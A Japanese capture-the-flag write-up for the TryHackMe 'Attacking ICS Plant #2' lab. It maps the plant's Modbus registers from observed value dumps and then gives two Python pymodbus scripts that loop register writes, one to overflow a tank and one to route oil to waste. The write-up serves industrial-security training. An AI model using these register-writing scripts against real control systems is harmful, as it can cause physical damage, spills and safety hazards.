# Attacking ICS Plant #2 CTF

https://tryhackme.com/room/attackingics2

レジスタは７種類。

```
供給ポンプを開閉する (PLC_FEED_PUMP)
タンクレベルセンサー (PLC_TANK_LEVEL)
出口バルブを開閉する（PLC_OUTLET_VALVE）
分離容器バルブ（PLC_SEP_VALVE）を開閉
廃油カウンター（PLC_OIL_SPILL）
処理油カウンター（PLC_OIL_PROCESSED）
廃水バルブを開閉 (PLC_WASTE_VALVE)
```

## レジスタ識別

初期状態から、供給ポンプが開いた

供給ポンプ開閉＝1

```
[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
```

タンクレベルセンサー到達、出口バルブが開いた

タンクレベルセンサー＝2  
出口バルブ開閉＝3

```
[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
```

排水が開いた

排水バルブ＝8

```
[0, 1, 0, 0, 0, 3, 106, 1, 0, 0, 0, 0, 0, 0, 0, 0]
[0, 1, 0, 0, 0, 3, 106, 1, 0, 0, 0, 0, 0, 0, 0, 0]
[0, 1, 0, 0, 0, 3, 106, 1, 0, 0, 0, 0, 0, 0, 0, 0]
```

セパレーターベッセルバルブが開いた

セパレーターベッセルバルブ＝4

```
[0, 0, 0, 1, 0, 5, 112, 1, 0, 0, 0, 0, 0, 0, 0, 0]
[0, 0, 0, 1, 0, 5, 115, 1, 0, 0, 0, 0, 0, 0, 0, 0]
[0, 0, 0, 1, 0, 5, 121, 1, 0, 0, 0, 0, 0, 0, 0, 0]
[0, 0, 0, 1, 0, 5, 137, 1, 0, 0, 0, 0, 0, 0, 0, 0]
```

廃油カウンター＝6  
処理油カウンター＝7

まとめ
```
供給ポンプ開閉＝1
タンクレベルセンサー＝2
出口バルブ開閉＝3
セパレーターベッセルバルブ＝4
廃油カウンター＝6
処理油カウンター＝7
排水バルブ＝8
```

## タンクをオーバーフローさせる

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(1, 1)  # 供給ポンプON
  client.write_register(2, 0)  # タンクレベルセンサーOFF
  client.write_register(3, 0) # 出力バルブOFF
```

## オイルを廃水バルブのみに流す

明らかにタスク説明の文と矛盾しているが、ヒントに従って下記が正解。

```python
#!/usr/bin/env python3

import sys
import time
from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = sys.argv[1]
client = ModbusClient(ip, port=502)
client.connect()
while True:
  client.write_register(1, 1)  # 供給ポンプON
  client.write_register(3, 1) # 出力バルブON
  client.write_register(4, 1) # セパレーターベッセルバルブON
  client.write_register(8, 0) # 排水バルブOFF
```

## Tags

#tags:modbus
